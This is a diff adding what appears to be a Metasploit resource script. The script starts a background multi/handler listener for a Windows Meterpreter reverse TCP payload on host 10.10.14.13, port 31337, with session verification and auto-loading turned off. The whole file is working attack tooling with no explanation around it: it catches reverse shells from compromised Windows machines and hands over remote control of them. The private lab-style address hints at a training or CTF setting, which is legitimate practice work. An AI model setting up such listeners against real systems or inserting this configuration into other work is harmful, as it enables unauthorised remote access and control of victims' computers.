@@ -1,0 +1,9 @@
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 10.10.14.13
+set LPORT 31337
+set ExitOnSession false
+set AutoVerifySession false
+set AutoSystemInfo false
+set AutoLoadStdapi false
+exploit -j
